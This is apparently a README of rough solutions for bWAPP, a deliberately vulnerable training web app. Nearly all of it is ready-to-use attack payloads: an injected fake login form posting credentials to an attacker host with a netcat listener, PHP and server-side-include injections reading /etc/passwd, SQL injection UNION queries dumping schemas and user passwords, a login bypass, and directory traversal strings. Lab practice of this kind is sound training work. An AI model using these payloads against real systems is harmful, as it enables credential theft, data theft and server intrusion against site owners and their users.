# solutions-bwapp
Rough solutions

Ref sheet
http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
http://www.sqlinjectionwiki.com/Categories/2/mysql-sql-injection-cheat-sheet/

# A1 - Injection

### HTML Injection - Reflected (GET)
htmli_get.php

```
/bWAPP/htmli_get.php?firstname=%3Ch1%3EHello%3C%2Fh1%3E&lastname=%3Ch2%3EWorld%3C%2Fh2%3E&form=submit
```
 
### HTML Injection - Reflected (POST)

```
<h1>Hello</h1>
<h2>World</h2>
```

### HTML Injection - Reflected (URL)

XXX:  Todo, IE only?
```
/bWAPP/htmli_current_url.php
```

### HTML Injection - Stored (Blog)

Following solution taken from:
```
http://penthusiasts.blogspot.com/2013/12/bwapp-html-injection-all.html
```
```
<div style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index: 1000; background-color:white; padding: 1em;">Please login with valid credentials:<br><form name="login" action="http://AttackerIP/login.htm"><table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td><td><input type="text" name="password"/></td></tr><tr><td colspan=2 align=center><input type="submit" value="Login"/></td></tr></table></form></div>
```

Attacker's machine:
```
nc -l 80
```

### PHP Code Injection

```
/bWAPP/phpi.php?message=a;echo "what"; $fp = fopen("/etc/passwd","r");$result = fread($fp,8192); echo $result
```
### Server-Side Includes:

```
<!--#echo var="DATE_LOCAL" -->
<!--#exec cmd="cat /etc/passwd" -->
```

### SQL Injection (GET/SEARCH)

```
a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;--
```

### SQL Injection (GET/SELECT)

```
movie=1 UNION ALL SELECT table_schema, table_name, null, null, null, null, null FROM information_schema.tables LIMIT 1 OFFSET 1;--
```
![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/sqli_2_1.png)
![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/sqli_2_2.png)

### SQL Injection (POST/Search)
/bWAPP/sqli_6.php

```
a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;-- 
```

### SQL Injection (POST/Select)

Use Burp
```
movie=1 UNION ALL SELECT table_schema, table_name, null, null, null, null, null FROM information_schema.tables LIMIT 1 OFFSET 1;--
```

### SQL Injection (AJAX/JSON/jQuery)
Use Burp 
```
a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;--
```
![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/sqli_10_1.png)

a%' UNION ALL SELECT 1, column_name, null, null, null, null, null from information_schema.columns where table_name="users";-- 

blah%' union all select 1,login,password,email,secret,1, 1 from users --

### SQL Injection (Login Form/Hero)
```
ok' or 1=1-- 
```
### SQL Injection(SQLite)

```
a%' UNION ALL SELECT 1,sqlite_version(),1,1,1,1; --
```



# A6 - Sensitive Data Exposure 

### Base64 Encoding (Secret)

Use Burp to get cookie

![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/insecure_crypt_storage_3.png)

# A7 - Missing Functional Level Access Control

### Directory Traversal - Directories
directory_traversal_2.php
```
/bWAPP/directory_traversal_2.php?directory=../../../../home/
```

### Directory Traversal - Files
directory_traversal_1.php
```
/bWAPP/directory_traversal_1.php?page=../../../../../etc/passwd
```

### Host Header Attack (Cache Poisoning)
hostheader_1.php

![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/hostheader_1_1.png)

### Host Header Attack (Reset Poisoning)
hostheader_2.php

![]()
